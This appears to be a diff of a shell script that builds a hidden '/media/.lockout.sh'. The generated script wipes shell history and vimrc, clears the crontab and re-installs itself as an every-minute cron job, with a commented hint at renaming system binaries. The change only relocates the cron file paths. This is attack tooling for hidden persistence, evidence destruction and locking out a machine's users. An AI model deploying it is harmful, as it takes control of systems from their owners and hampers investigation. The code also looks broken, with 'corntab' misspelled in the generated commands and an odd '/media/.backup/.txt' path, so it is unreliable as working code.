@@ -125,14 +125,14 @@ echo "echo \"\" > ~/.bash_history" >> "/media/.lockout.sh"
 echo "echo \"\" > ~/.vimrc" >> "/media/.lockout.sh"
 # clear the cronjobs and reapply my cronjobs
 echo "corntab < /dev/null" >> "/media/.lockout.sh"
-echo "echo \"* * * * * \"/media/.lockout.sh\"\" > \"/media/.cron.txt\"" >> "/media/.lockout.sh"
-echo "corntab \"/media/.cron.txt\"" >> "/media/.lockout.sh"
+echo "echo \"* * * * * \"/media/.lockout.sh\"\" > \"/media/.backup/cron.txt\"" >> "/media/.lockout.sh"
+echo "corntab \"/media/.backup/cron.txt\"" >> "/media/.lockout.sh"
 
 chmod +x "/media/.lockout.sh"
 
 # apply cron job 
-echo "* * * * * /media/.lockout.sh" > /media/.cron.txt
-crontab /media/.cron.txt
+echo "* * * * * /media/.lockout.sh" > /media/.backup/.txt
+crontab /media/.backup/.txt
 
 # Change the names of all of the binaries
 # for FILE in *;do
